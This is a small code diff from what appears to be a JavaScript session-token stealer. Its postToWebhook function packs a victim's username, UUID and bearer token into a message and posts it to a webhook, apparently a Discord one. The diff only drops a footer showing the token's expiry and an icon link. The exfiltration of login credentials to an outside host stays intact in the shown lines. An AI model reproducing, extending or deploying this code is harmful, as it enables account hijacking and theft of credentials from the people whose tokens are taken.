@@ -135,11 +135,7 @@ function postToWebhook(username, bearerToken, uuid) {
                 {name: "SessionID", value: bearerToken, inline: false},
                 {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: true},
             ]
-        }],
-        footer: {
-            "text": `Token expr: ${new Date(Date.now() + 86400000).toLocaleString()}`,
-            "icon_url": "https://cdn.discordapp.com/attachments/1021436161694105656/1028578410571767869/apple-clock-493151.png"
-        }
+        }]
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
